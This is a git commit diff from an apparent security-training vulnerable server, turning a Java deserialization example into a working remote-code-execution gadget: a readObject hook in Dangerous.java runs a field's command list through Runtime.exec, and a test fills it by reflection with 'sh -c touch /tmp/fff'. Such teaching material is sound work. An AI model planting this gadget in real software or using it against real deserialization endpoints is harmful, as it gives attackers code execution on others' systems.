bd37ea37e17dd43aff47bef6eeb4f2e83e92b190
BennyHusted <bennyhusted@gmail.com>
2017-11-13 19:18:30 -0800

    Changed deserialization example to actually use remote code execution.

--- VulnServer/src/com/sectraining/vulnserver/decereal/Dangerous.java
+++ VulnServer/src/com/sectraining/vulnserver/decereal/Dangerous.java
@@ -1,6 +1,45 @@
 package com.sectraining.vulnserver.decereal;
 
+import java.io.IOException;
+import java.io.InputStream;
 import java.io.Serializable;
+import java.util.ArrayList;
+import java.util.List;
 
-public class Dangerous extends DangerousParent implements Serializable{
+public class Dangerous implements Serializable{
+
+	private List<String> stuff;
+	
+	private void badthing() {
+		if(stuff != null && !stuff.isEmpty()) {
+			Runtime rt = Runtime.getRuntime();
+		    Process proc;
+		    int result = 0;
+			try {
+				String cmds[] = new String[stuff.size()];
+				stuff.toArray(cmds);
+				proc = rt.exec(cmds);
+				result = proc.waitFor();
+				
+			    InputStream in = (result == 0) ? proc.getInputStream() : proc.getErrorStream();
+			    String output = "";
+				int c;
+				while ((c = in.read()) != -1) {
+					System.out.print((char) c);
+					output +=(char) c;
+				}
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}catch (InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+	}
+	
+	 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
+		 in.defaultReadObject();
+		 badthing();
+	 }
 }
--- VulnServer/src/com/sectraining/vulnserver/decereal/SerializationTest.java
+++ VulnServer/src/com/sectraining/vulnserver/decereal/SerializationTest.java
@@ -6,7 +6,9 @@ import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import java.util.ArrayList;
 import java.util.Base64;
+import java.util.List;
 
 public class SerializationTest {
 
@@ -21,6 +23,14 @@ public class SerializationTest {
 		Class<?> dangClass = Dangerous.class;
 		Object dangObj = dangClass.newInstance();
 		
+		Field field = dangObj.getClass().getDeclaredField("stuff");
+		field.setAccessible(true);
+		ArrayList<String> commandList = new ArrayList<String>();
+		commandList.add("sh");
+		commandList.add("-c");
+		commandList.add("touch /tmp/fff");
+		
+		field.set(dangObj, commandList);
 		
 		((BenignSession)obj).placeholder = dangObj;
 		
